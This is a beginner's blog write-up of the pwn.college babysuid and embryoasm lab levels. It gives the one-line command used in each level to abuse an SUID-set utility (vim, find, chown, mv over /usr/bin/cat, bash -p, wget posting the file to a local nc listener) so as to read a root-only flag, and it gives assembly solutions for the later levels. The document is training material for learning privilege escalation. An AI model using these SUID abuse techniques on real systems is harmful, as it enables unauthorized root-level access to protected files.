---
title: "Notes of pwn.college babysuid&embryoasm levels"
date: "2022-01-04"
author: "uoft-flyfreejay"
description: "short notes for pwn.college dojo's pre-pwn exercises"
---

# Intro

My first ever write-ups (woohoo)!

The first half of this page will have short notes on each level of pwn.college's Program Misues module exercises, babysuid.
The module is about privilege escalation. Each level will let me use one program with unnecessary SUID, and I will have to *abuse* that program to read **/flag** using the root privileges. 

Let's get started then!

## babysuid

### level1

- short write-ups

The first level that introduces us to babysuid. We will first move to `/challenge` folder and use `ls` right after by doing

```bash
cd /challenge; ls
```

This shows that there exists an executable name `babysuid_level1` inside the folder. 

Running this tells me that the program has set SUID bit on `/usr/bin/cat`. Now we can use `cat` to read the flag! 

```bash
cat /flag
```

### level2

- short write-ups

From now on, assume that the first thing I will do is navigating to */challenge* directory and running the executable there to set the SUID bit on the necessary program. 

This time we are using `more` utility. Just like `cat`, we can simply run

```bash
more /flag
```

and there we go!

### level3

- short write-ups

This time we are using `less`. Another freebie level.

```bash
less /flag
```

### level4

This time we are using `tail`.

```bash
tail /flag
```

### level5

This time we are using `head`.

```bash
head /flag
```

### level6

This time we are using `sort`. 

```bash
sort /flag
```

the `/flag` file only contained one line of text, which is the flag. So using `sort` like the previous commands had no problem. 

### level7

This time we are using the infamous `vim`.

```bash
vim /flag
```

And we can look at the contents as we are 'editing' it with `vim`. As you can see, the programs given to us are getting further and further from a simple file-viewing utility. 

### level8

This time we are using `emacs` (TEAM EMACS FOR THE WIN).

```bash
emacs /flag
```

### level9

This time we are using `nano` 

```bash
nano /flag
```

### level10

This time we are using `rev`. 

This time we would need to think a bit. Since `rev` will return the contents of `/flag` in reversed order, applying `rev` twice will give us the original contents! We will do so by using the pipes:

```bash
rev /flag | rev
```

### level11

This time we are using `od`.

I wasn't too familiar with `od`, but a little googling taught me that it is a program that will read me the contents of a file in various formats (binary, hexadecinal, characters, etc...).

We can use a combination of `-An` and `-c` flag to view the contents of the files in character format, ignoring the byte offsets. 

```bash
od -An -c /flag
```

The output is still not very clean, as each characters are seperated by white spaces. I decided to clean it using python.

```python
flag = 'p   w   n   .   c   ...'
print(''.join(flag.split()))
```

### level12

This time we are using `hd`.

It's also called `hexdump`, and it is an utility that is similiar to `od`. It will let me view the file in specified format. Right now, I am only interested in the string representation, so including `-e` flag will help me.

```bash
hd -e /flag
```

### level13

This time we are using `xxd`.

First time using this utility. Looking at the man page showed me that it creates a hexdump of a given file (or from STDIN if no file is specified). I decided to test it out and simply called:

```bash
xxd /flag
```

But it seems that `xxd` also prints out the string representation of the data along with the hexdump by default. Got the flag! 

### level14

This time we are using `base32`.

This will let us base32 encode/decode the file. Similar to `rev`'s approach, I will first encode the contents and pipe the output to decode to get the original flag. 

```bash
base32 /flag | base32 -d
```

### level15

This time we are using `base64`.

Same approach as `level14`.

```bash
base64 /flag | base64 -d
```

### level16

This time we are using `split`.

This utility will help us 'split' or break down the file into pieces into a new output file. I am pretty sure that our `/flag` file only contains one line (which is our flag) so simply calling:

```bash
split /flag
``` 

will generate a new outcome file in your current directory called `xaa`. Reading it with `cat` will give us the flag! 

### level17

This time we are using `gzip`.

It seems like I am allowed to use the whole `gzip` suite in this challenge. I can simply compress `/flag` and view the compressed file with `zcat`. 

```bash
gzip /flag
zcat /flag.gz
```

### level18

This time we are using `bzip2`.

Same approach as `gzip`. However, this challenge I could not use the other suite utilities (`bunnzip2`, `bzcat`). But those are just `bzip2` with extra flags anyways.

```bash
bzip2 /flag
bzip2 -c -d /flag.bz2
```

### level19

This time we are using `zip`.

Same approach as other compression utilities. I will first compress `/flag` into an archive and view the file using `zcat`. This works, because there will be only one file (`/flag`) in our archive.

```bash
zip flag.zip /flag
zcat flag.zip
```

### level20

This time we are using `tar`.

A quick googling revealed to me that `vim` has a built-in functionality that lets me view the contents of a tar archive. Let's compress `/flag` into a tar archive and view it with `vim`.

```bash
tar -cvf flag.tar /flag
vim flag.tar
```

### level21

This time we are using `ar`.

Same approach as above. Create an archive, and then read with `vim`.

```bash
ar r flag.a /flag
vim flag.a
```

### level22

This time we are using `cpio`.

Same approach as above. Create an archive, and then read with `vim`.

```bash
echo /flag | cpio -o > flag.cpio
vim flag.cpio
```

### level23

This time we are using `genisoimage`.

This level was **VERY** interesting. `genisoimage` is an outdated program that creates `iso` disc images. My first naive attempt was to try to create a disc image and `vim` it like usual. However, it just printed the error message that I had no permissino to do so! 

A little bit of more research and watching the office hour session for this challenge revealed that `genisoimage` is SUID-proof. Investigating the system calls of `genisoimage` showed me that it actually gets the user ID and sets the effective user ID as the original user, not the root. So I had to cycle through bunch of flags that would make the operation happen before `genisoimage` does that silly thing. 

And the answer was...

```bash
genisoimage -sort /flag
```

- side-notes

The exploit here is actually a 0-day vulnerability. I did not actually use the SUID power that `pwn.college` allowed me, but exploited an actual vulnerability that the program originally had. There is a reason why this is outdated!

### level24

This time we are using `env`.

`env` alone will just print out all the environmental variables. However, adding `-i` flag lets me execute a command in an empty environmental. 

```bash
env -i cat /flag
```

### level25

This time we are using `find`.

We can 'find' a specific file with `find`. Not only that, `-exec [COMMAND] {} +` flag allows me to execte the specified command! 

```bash
find -name flag -exec cat {} +
```

### level26

This time we are using `make`.

While most people use `make` to compile, here I will use it to simply run `cat` using the parent SUID power. 

I edit the Makefile to be

```
all:
    cat /flag
```

and simply call

```bash
make
```

### level27

This time we are using `nice`.

Another scheduling program that lets me execute a command in the name of the Almighty. 

```bash
nice cat /flag
```

### level28

This time we are using `timeout`.

This program lets us execute a command within a specific time interval. The man page did not tell me what the unit of measurement is, so I just used 1 like this:

```bash
timeout 1 cat /flag
```

But whatever it is, I guess `cat` is fast enough and I got my flag.

### level29

This time we are using `stdbuf`.

This program lets us execute a command in a modified buffering for its standard streams. I did not want to deal with any modified behaviours, so I used `L` mode to make my standard out stream unbuffered. 

```bash
stdbuf -o L cat /flag
```

### level30

This time we are using `setarch`.

'`setarch` modifies execution domains and process personality flags.' (I do not quite understand what it exactly does). Since I am only interested in running `cat`, most architecture types should be OK

```bash
setarch i386 cat /flag
```

### level31

This time we are using `watch`.

This program will execute a specified command over a certain time interval, default being every 2 seconds. `-x` lets us to specify which command. 

```bash
watch -x cat /flag
```

### level32

This time we are using `socat`.

`socat` lets me to redirect input and output from different type of system resources like network, *file*, command, socket, and etc. A little bit of googling taught me how to redirect a file as an input. 

```bash
socat PIPE:/flag STDOUT
```

### level33

This time we are using `whiptail`.

`whiptail` displays a text or a file in a dialog box.

```bash
whiptail --textbox /flag 12 8
```

The numbers at the end were required to set the dialog box size.

### level34

This time we are using `awk`.

`awk` allows us to read from a file and perform operations on them. For this challenge, I am only interested in reading. 

```bash
awk '{ print $0 }' /flag
```

### level35

This time we are using `sed`. 

`sed` allows me to perform a text manipulation. Since our flag text starts with `pwn` at the beginning, I decided to change `pwn` to `gwn`. 

```bash
sed 's/pwn/gwn/g' /flag
```

When `sed` prints the outcome, change `gwn` part back to `pwn`. 

### level36

This time we are using `ed`. 

Another text manipulation program. `ed` is used by adding texts, either from STDIO or from a file to the buffer to perform edits. Calling

```bash
ed /flag
```

will add `/flag` contents to the buffer and entering `p` will let us view the buffer. 

### level37

This time we are using `chown`.

This is the killer utility. It changes the ownership of a file. I simply made `/flag` mine and `cat`.

```bash
chown hacker /flag
cat /flag
```

### level38

This time we are using `chmod`.

The plan is to change the read permission of others and simply `cat` the flag.

```bash
chmod o=r /flag
cat /flag
```

### level39

This time we are using `cp`.

It is a famous utility that lets us to copy files. I tried making a copy of `/flag`, but it seems that the copy also inherits the same permissions as the original. However, copying the contents of `/flag` into another file can bypass that. 

```bash
touch a.txt
cp /flag a.txt
cat a.txt
```

### level40

This time we are using `mv`.

Another very interesting level. I was stuck for a couple of minutes looking through the man page to find a way to display a file using `mv`. However, such feature does not exist in `mv`. What is possible however, is run the challenge binary to set the SUID for `/usr/bin/mv`, and use the root privilege to change the name of `/usr/bin/cat` program to `/usr/bin/mv`! Then run the challenge binary once again to set the SUID of `mv` (which is actually `cat`).

```bash
mv /usr/bin/cat /usr/bin/mv
/challenge/babysuid_level40
mv /flag
```

### level41

This time we are using `perl`.

We can run a simple `perl` programs with `-e` commandline option. As I am not very familiar with `perl`, I googled and found this:

```bash
perl -n -e 'print "$. - $_"' /flag
```

### level42

This time we are using `python`.

Python!! Writing a simple script that reads `/flag` would do.

```python
from subprocess import *
Popen(["cat", "/flag"])
```

### level43

This time we are using `ruby`.

I had to write a short ruby script. 

```ruby
exec "cat /flag"
```

### level44

This time we are using `bash`.

In the lecture, the professor pointed out that shell programs like `bash` resets the EUID to the original UID. Adding `-p` when invoking disables that feature.

```bash
bash -p
cat /flag
```

### level45

This time we are using `date`.

This program also let's me to specify a file to print out the date inside the file. Although the contents in `/flag` are not in date format, the program still prints the contents as it gives error. 

```bash
date --file=/flag
```

### level46

This time we are using `dmesg`.

Same as above. View the system log using `/flag` as the input file.

```bash
dmesg --file=/flag
```

### level47

This time we are using `wc`.

`--files0-from` lets me to put `/flag` as the input.

```bash
wc --files0-from /flag
```

### level48

This time we are using `gcc`.

I will make `gcc` force include `/flag` and print out the contents through error. I will just use a random source code c file for source.

```bash
gcc -include /flag a.c
```

### level49

This time we are using `as`.

Same approach as above. Use `-n` option to include `/flag` as the header file and cause `as` to output error messages.

```bash
as -n /flag a.s
```

### level50

This time we are using `wget`.

This is a network downloader. We can establish a server on localhost posting `/flag`, and use `nc` on other terminal to get the file.

```bash
wc --post-file=/flag http://localhost
```

And on the other terminal,

```bash
nc -lp 80
```

Since we are using `http`, port 80 is used.

### level51

This time we are using `ssh-keygen`.

Final level! However, I did not understand the mechanism behind this level as I lack the background knowledge. I referred to the office hour video for the [solution](https://dojo.pwn.college/challenges/misuse), and I am planning to come back to it after I study more in-depth C programming. 

## Final Notes

I got to learn many new Linux commands and utilities in this module. This gave me a rough idea on how hackers could go on to abuse the SUID for *privilege escalation*. With this knowledge gained, let's step forward to the next unit, Assemblies! 

## embryoasm

The next 23 challenges consist of x86-64 Assembly challenges. I will have to write an Assembly code to do what each level asks of me and convert the code into byte format. Let's get hacking!

### level1

This level requires us to change the value of `rdi` register to `0x1337`. Let us use the Intel syntax and write the required Assembly code.

```asm
//name: l1.s
.global _start
.intel_syntax noprefix
_start:
    mov rdi, 0x1337
```

The above code simply puts the value `0x1337` into `rdi`. We will now compile the code and `objcopy` the executable to get the binary.

```bash
gcc -nostdlib --static -o l1.elf l1.s
objcopy --dump-section .text=l1.bin l1.elf
```

Now let's send the contents of `l1.bin` to our challenge executable.

```bash
cat l1.bin | /challenge/$HOSTNAME
```

### level2

This level requires us to add `0x331337` to `rdi` register. We can do this simply by using `add` instruction.

```asm
//name: l2.s
.global _start
.intel_syntax noprefix
_start:
    add rdi, 0x331337
```

From now on, after I write the necessary ASM code, assume that I run the same steps as `level1` and send the bytes to the challenge executable. 

### level3

This level requires us to emulate a following equation: `mx + b`, where `m = rdi`, `x = rsi`, and `b = rdx`. I will multiply `rdi` and `rsi`, storing the result in `rsi` and add `rdx` to `rsi`. Finally, I will move `rsi` to `rax` just like how the level requires.

```asm
//name: l3.s
.global _start
.intel_syntax noprefix
_start:
    imul rsi, rdi
    add rsi, rdx
    mov rax, rsi
```

### level4

This level requires us to simply divide `rdi` by `rsi`. Dividing in x86-64 Assembly works a little differently. We first have to store the dividend into `rax` and call `div reg2`, where `reg2` is a divisor. The result is stored in `rax` and the remainder in `rdx`. 

```asm
//name: l4.s
.global _start
.intel_syntax noprefix
_start:
    mov rax, rdi
    div rsi
```

### level5

This level is similar as the above, but remainders this time! 

```asm
//name: l5.s
.global _start
.intel_syntax noprefix
_start:
    mov rax, rdi
    div rsi
    mov rax, rdx
```

### level6

This level requires me to do modulus operation again but with only using `mov`! Do not panick however. The divisors are each `256` and `65536`, which are very special numbers. They are powers of `16`. Therefore, modulus by them means we are just getting the last 8-bit and 16-bit digits of the registers. We can access them by using lower-bit compatible registers. This is similar to how `5678 % 100` is just `78`. 

```asm
//name: l6.s
.global _start
.intel_syntax noprefix
_start:
    mov rax, 0
    mov al, dil
    mov rbx, 0
    mov bx, si
```

### level7

This level wants me to set `rax` to `rdi`'s 4th least significant *byte*. 

We can achieve so with shifting the bytes. Since 1 byte = 8 bits:

```asm
//name: l7.s
.global _start
.intel_syntax noprefix
_start:
    mov rax, rdi
    shl rax, 16
    shl rax, 16
    shr rax, 16
    shr rax, 16
    shr rax, 16
    shr rax, 8
```

This will shift left until 4th least sig-byte, and shift back to right to only leave the 4th least sig-byte.

### level8

This level wants me to store the result of `rdi AND rsi` into `rax`, without using `mov` and `xchg`.

We can do this by abusing the fact that using `AND` with `0` resets any number to `0`. And `OR` with a register with `0` will simply copy the other value into that register. 

```asm
//name: l8.s
.global _start
.intel_syntax noprefix
_start:
    AND rax, 0
    AND rdi, rsi
    OR rax, rdi
```

### level9

Instruction:

```
if x is even then
  y = 1
else
  y = 0
where:
x = rdi
y = rax
```

`XOR` is the key here. 

```asm
//name: l9.s
.global _start
.intel_syntax noprefix
_start:
    AND rax, 0
    AND rdi, 1
    XOR rdi, 1
    OR rax, rdi
```

### level10

Instruction:

```
1. Place the value stored at 0x404000 into rax
2. Increment the value stored at the address 0x404000 by 0x1337
Make sure the value in rax is the original value stored at 0x404000 and make sure 
that [0x404000] now has the incremented value
```

This level is about deferencing. We are interested in the value stored at the memory location `0x404000` and we can access it by `[0x404000]`. The compiler was not happy when I tried to increment the value at `[0x404000]` directly, so I had to do the arithmetic at `rsi`.

```asm
//name: l10.s
.global _start
.intel_syntax noprefix
_start:
    mov rax, [0x404000]
    mov rsi, rax
    add rsi, 0x1337
    mov [0x404000], rsi
```

### level11

Reference: https://web.stanford.edu/class/archive/cs/cs107/cs107.1206/guide/x86-64.html

Instruction:

```
Please perform the following:
1) Set rax to the byte at 0x404000
2) Set rbx to the word at 0x404000
3) Set rcx to the double word at 0x404000
4) Set rdx to the quad word at 0x404000
```

We can do this easily by using lower-bit registers. 

```asm
//name: l11.s
.global _start
.intel_syntax noprefix
_start:
    mov al, [0x404000]
    mov bx, [0x404000]
    mov ecx, [0x404000]
    mov rdx, [0x404000]
```

### level12

Instruction:

```
For this challenge we will give you two addresses created dynamically each run. The first address
will be placed in rdi. The second will be placed in rsi.
Using the earlier mentioned info, perform the following:
1. set [rdi] = 0xDEADBEEF00001337
2. set [rsi] = 0x000000C0FFEE0000
Hint: it may require some tricks to assign a big constant to a dereferenced register. Try setting
a register to the constant than assigning that register to the derefed register.
```

Another deferencing problem. Just like what the instruction warns, I had to use another register to move the large constants

```asm
//name: l12.s
.global _start
.intel_syntax noprefix
_start:
    mov rax, 0xDEADBEEF00001337
    mov [rdi], rax

    mov rax, 0x000000C0FFEE0000
    mov [rsi], rax
```

### level13

Instruction:

```
Preform the following:
1. load two consecutive quad words from the address stored in rdi
2. calculate the sum of the previous steps quad words.
3. store the sum at the address in rsi
```

We can use offset referencing. `+8` to the address of `rdi` will get the next `QUAD WORD`. 

```asm
//name: l13.s
.global _start
.intel_syntax noprefix
_start:
    mov rax, [rdi+8]
    add rax, [rdi]
    mov [rsi], rax
```

### level14

Instruction:

```
Subtract rdi from the top value on the stack.
```

Stack is where temporary variables are stored during the runtime. The top of the stack is accessible with `rsp` pointer. 

```asm
//name: l14.s
.global _start
.intel_syntax noprefix
_start:
    sub [rsp], rdi
```

### level15

Instruction:

```
Using only following instructions:
push, pop
Swap values in rdi and rsi.
i.e.
If to start rdi = 2 and rsi = 5
Then to end rdi = 5 and rsi = 2
```

Here is my approach: I will first push both values to the stack. Then, I will pop from the stack in the same order. Due to the LIFO nature, the values popped will come out in the reversed order. 

```asm
//name: l15.s
.global _start
.intel_syntax noprefix
_start:
    push rdi
    push rsi
    pop rdi
    pop rsi
```

### level16

Instruction:

```
Without using pop please calculate the average of 4 consecutive quad words stored on the stack.
Store the average on the top of the stack. Hint:
RSP+0x?? Quad Word A
RSP+0x?? Quad Word B
RSP+0x?? Quad Word C
RSP      Quad Word D
RSP-0x?? Average
```

Another thing to note is that the stack grows DOWN. So we will have to add the offsets instead of subtracting them. 

```asm
//name: l16.s
.global _start
.intel_syntax noprefix
_start:
    mov rax, 0
    add rax, [rsp]
    add rax, [rsp+8]
    add rax, [rsp+16]
    add rax, [rsp+24]
    mov rsi, 4
    div rsi
    push rax
```

### level17

Instruction:

```
Using the above knowledge, perform the following:
Create a two jump trampoline:
1. Make the first instruction in your code a jmp
2. Make that jmp a relative jump to 0x51 bytes from its current position
3. At 0x51 write the following code:
4. Place the top value on the stack into register rdi
5. jmp to the absolute address 0x403000
```

The key here is to use `nop` `0x51` times to write instructions to `0x51` bytes from the current position. 

```asm
//name: l17.s
.global _start
.intel_syntax noprefix
_start:
    jmp star
    .rept 0x51
    nop
    .endr
star:
    pop rdi
    mov rax, 0x403000
    jmp rax
```

### level18

Instruction:

```
Using the above knowledge, implement the following:
if [x] is 0x7f454c46:
   y = [x+4] + [x+8] + [x+12]
else if [x] is 0x00005A4D:
   y = [x+4] - [x+8] - [x+12]
else:
   y = [x+4] * [x+8] * [x+12]

where:
x = rdi, y = rax. Assume each dereferenced value is a signed dword. This means the values can start asa negative value at each memory position.
A valid solution will use the following at least once:
jmp (any variant), cmp
```

This was a long one. I had to be mindful of the fact that we are dealing with `dword`. However, I got the hang of a Assembly coding style. 

```asm
//name: l18.s
.global _start
.intel_syntax noprefix
_start:
    cmp dword ptr[rdi], 0x7f454c46
    jne elseif
if:
    mov rax, 0
    add eax, dword ptr [rdi+4]
    add eax, dword ptr [rdi+8]
    add eax, dword ptr [rdi+12]
    jmp post
elseif:
    cmp dword ptr[rdi], 0x00005A4D
    jne else
    mov rax, 0
    add eax, dword ptr [rdi+4]
    sub eax, dword ptr [rdi+8]
    sub eax, dword ptr [rdi+12]
    jmp post
else:
    mov rax, 0
    add eax, dword ptr [rdi+4]
    imul eax, dword ptr [rdi+8]
    imul eax, dword ptr [rdi+12]
    jmp post
post:
    nop
```

### level19

Instruction:

```
Using the above knowledge, implement the following logic:
if rdi is 0:
    jmp 0x403058
else if rdi is 1:
    jmp 0x4030c9
else if rdi is 2:
    jmp 0x403102
else if rdi is 3:
    jmp 0x403165
else:
    jmp 0x4031a9
Please do the above with the following constraints:
- assume rdi will NOT be negative
- use no more than 1 cmp instruction
- use no more than 3 jumps (of any variant)
- we will provide you with the number to 'switch' on in rdi.
- we will provide you with a jump table base address in rsi.
```

The addess will be stored in `rsi` to prevent us from cheating by hardcoding. In the address table, each address reference goes up by 1 byte. We can use pointer arithmetic to access them. If `rdi` is less than or equal to 3, we can do `[rsi + 0x8 * rdi]`. If not, we just do `[rsi + 0x8 * 4]`. 

```
//name: l19.s
.global _start
.intel_syntax noprefix
_start:
    cmp rdi, 3
    jg else
    mov rax, 0x8
    imul rax, rdi
    add rax, rsi
    jmp [rax]
else:
    jmp [rsi + 0x8 * 4]
```

### level20

Instruction:

```
Please compute the average of n consecutive quad words, where:
rdi = memory address of the 1st quad word
rsi = n (amount to loop for)
rax = average computed
```

There was a typo in the instruction. There are n consecutive `double words`, not quad. I had to refer to the office hour video to address the issue. Other than that, another `jmp` level. We jump to the end to divide once the gate keep variable becomes bigger than `rsi`. Note that I first add the value from the array to `ebx` first and then add `rbx` (64-bit version of `ebx`) to `rax` to make use of the extended 64-bit digits. 

```asm
//name: l20.s
.global _start
.intel_syntax noprefix
_start:
    mov rax, 0  
    mov r12, 1 
loop:
    cmp r12, rsi
    jg out
    mov rbx, 0
    mov ebx, dword ptr [rdi]
    add rax, rbx
    add rdi, 0x4
    add r12, 1
    jmp loop
out:
    div rsi
```

### level21

Instruction:

```
Using the above knowledge, please perform the following:
Count the consecutive non-zero bytes in a contiguous region of memory, where:
rdi = memory address of the 1st byte
rax = number of consecutive non-zero bytes
Additionally, if rdi = 0, then set rax = 0 (we will check)!
An example test-case, let:
rdi = 0x1000
[0x1000] = 0x41
[0x1001] = 0x42
[0x1002] = 0x43
[0x1003] = 0x00
then: rax = 3 should be set
```

We simply iterate through the array until we see a 0 byte. Since we are dealing with bytes, we will use a lower 8-bit register to keep track of the bytes.

```asm
//name: l21.s
.global _start
.intel_syntax noprefix
_start:
    mov rax, 0
loop:
    mov sil, [rdi]
    cmp sil, 0
    je done
    add rax, 1
    add rdi, 1
    jmp loop
done:
    nop
```

### level22

Instruction:

```
str_lower(src_addr):
    rax = 0
    if src_addr != 0:
        while [src_addr] != 0x0:
            if [src_addr] <= 90:
                [src_addr] = foo([src_addr])
                rax += 1
            src_addr += 1
foo is provided at 0x403000. foo takes a single argument as a value
```

This level is about `call` and `ret`. Because running `foo` function at the given memory location might change our register values, we have to store our current `rax` and `rdi` onto the stack as well. Another thing to note is that we are dealing with bytes again, so use the lower 8-bit registers when applicable.

```asm
//name: l21.s
.global _start
.intel_syntax noprefix
_start:
    mov rax, 0
    cmp rdi, 0
    je done
while:
    mov sil, [rdi]
    cmp sil, 0
    je done
    cmp sil, 90
    jg finally
    mov rcx, 0x403000
    push rax
    push rdi
    mov rdi, [rdi]
    call rcx
    pop rdi
    mov [rdi], al
    pop rax
    add rax, 1
finally:
    add rdi, 1
    jmp while
done:
    ret
```

### level23

Last level of assembly challenges!

Instruction:

```
most_common_byte(src_addr, size):
    b = 0
    i = 0
    for i <= size-1:
        curr_byte = [src_addr + i]
        [stack_base - curr_byte] += 1
    b = 0

    max_freq = 0
    max_freq_byte = 0
    for b <= 0xff:
        if [stack_base - b] > max_freq:
            max_freq = [stack_base - b]
            max_freq_byte = b 

    return max_freq_byte

Assumptions:
- There will never be more than 0xffff of any byte
- The size will never be longer than 0xffff
- The list will have at least one element
Constraints:
- You must put the "counting list" on the stack
- You must restore the stack like in a normal function
- You cannot modify the data at src_addr
```

Capstone challenge. Couple things to note:

- when comparing `b` with `0xff`, I had to use 16-bit to prevent overflows. 

- Allocate enough space in stack, I just subtracted the base by `0xffff` to be sufficient.

- first two arguments are stored in `rdi` and `rsi`.

- Make sure to follow the x64 stack call convention.

- Although the instruction does not specify, assume that we increment `i` and `b` by `1` at the end of each loop.

- Mostly operate in lower 8-bit registers

- Store the return value in `rax`.

Those were all the things I had to watch out for. 

```asm
//name: l23.s
.global _start
.intel_syntax noprefix
_start:
    push rbp
    mov rbp, rsp
    sub rsp, 0xffff
    mov rdx, 0 ;b = 0
    mov rcx, 0 ;i = 0
for1:
    mov r12, rsi
    sub r12, 1
    cmp rcx, r12 
    jg final1
    mov r8b, [rdi+rcx]
    mov r12, rbp
    sub r12, r8
    add byte ptr [r12], 1
    add rcx, 1
    jmp for1
final1:
    mov rdx, 0  
    mov r9, 0  
    mov r10, 0  
for2:
    cmp dx, 0xff
    jg out
    mov r12, rbp
    sub r12, rdx
    cmp byte ptr [r12], r9b
    jle final2
    mov r9b, byte ptr [r12]
    mov r10w, dx
final2:
    add dx, 1
    jmp for2
out:
    mov al, r10b
    mov rsp, rbp
    pop rbp
    ret
```


